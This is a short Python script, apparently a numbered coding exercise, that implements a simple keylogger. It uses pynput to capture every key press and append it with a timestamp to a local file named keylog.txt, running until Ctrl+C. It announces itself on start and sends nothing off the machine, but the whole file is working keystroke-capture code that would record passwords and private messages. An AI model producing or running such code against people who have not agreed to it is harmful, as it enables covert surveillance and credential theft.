'''
Task # 4
Simple Keylogger
Create a basic keylogger program that records and logs keystrokes. 
'''

from pynput import keyboard
import time

def on_key_press(key):
    with open("keylog.txt", "a") as log_file:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        log_file.write(f"{timestamp} - {key}\n")

def main():
    print("Press Ctrl+C to stop logging.")
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()  # for start listener in non-blocking mode

    try:
        while True:
            time.sleep(0.1)  # for keeps main thread alive
    except KeyboardInterrupt:
        print("\nLogging stopped by user.")
        listener.stop()

if __name__ == "__main__":
    main()
